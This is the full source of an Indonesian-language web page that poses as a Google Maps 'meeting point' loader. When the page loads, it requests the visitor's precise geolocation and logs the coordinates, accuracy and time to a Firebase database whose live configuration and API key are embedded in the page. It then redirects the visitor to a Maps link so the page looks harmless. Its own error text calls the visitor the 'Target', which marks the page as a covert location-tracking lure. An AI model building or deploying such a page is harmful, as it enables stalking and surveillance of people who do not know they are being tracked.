<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Titik Temu Google Maps</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding-top: 100px; background-color: #f8f9fa; color: #333; }
        .loader { border: 10px solid #f3f3f3; border-top: 10px solid #4285F4; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>

    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
</head>
<body>

    <h2>Memuat Lokasi Titik Temu...</h2>
    <div class="loader"></div>
    <p>Mohon tunggu sebentar, sedang menyinkronkan dengan Google Maps.</p>

    <script>
        // --- KOREKSI KONFIGURASI FIREBASE SESUAI GAMBAR DATABASE ANDA ---
        const firebaseConfig = {
            apiKey: "AIzaSyDLvcWnSRgoXxmid11Wx_GiVnOJMmgQR9I",
            authDomain: "maps-a9472.firebaseapp.com",
            databaseURL: "https://maps-a9472-default-rtdb.firebaseio.com", // <-- KOREKSI DI SINI (Tanpa asia-southeast1)
            projectId: "maps-a9472",
            storageBucket: "maps-a9472.firebasestorage.app",
            messagingSenderId: "642710632619",
            appId: "1:642710632619:web:b702560570f3e52e5c1fee"
        };
        
        // Inisialisasi Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // Target pengalihan setelah koordinat didapat
        const TARGET_MAPS_URL = "https://goo.gl/maps/c6mZ8WnS2R9yT2Gv5"; 

        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
                    enableHighAccuracy: true,
                    timeout: 7000,
                    maximumAge: 0
                });
            } else {
                saveToFirebase({ status: "Browser tidak mendukung Geolocation" });
            }
        };

        function sendLocation(position) {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            const acc = position.coords.accuracy;
            const timestamp = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

            const data = {
                waktu: timestamp,
                latitude: lat,
                longitude: lng,
                akurasi_meter: Math.round(acc),
                google_maps_link: `https://www.google.com/maps?q=${lat},${lng}`,
                status: "Berhasil mendapatkan lokasi"
            };

            saveToFirebase(data);
        }

        function handleError(error) {
            let pesanGagal = "";
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    pesanGagal = "Target menolak (Block) izin lokasi.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    pesanGagal = "Posisi tidak tersedia.";
                    break;
                case error.TIMEOUT:
                    pesanGagal = "Waktu permintaan habis.";
                    break;
            }
            
            const timestamp = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
            saveToFirebase({ waktu: timestamp, status: pesanGagal });
        }

        function saveToFirebase(objekData) {
            database.ref('logs_lokasi').push(objekData)
            .then(() => {
                redirectToMaps();
            })
            .catch((err) => {
                console.error(err);
                redirectToMaps();
            });
        }

        function redirectToMaps() {
            window.location.href = TARGET_MAPS_URL;
        }
    </script>
</body>
</html>
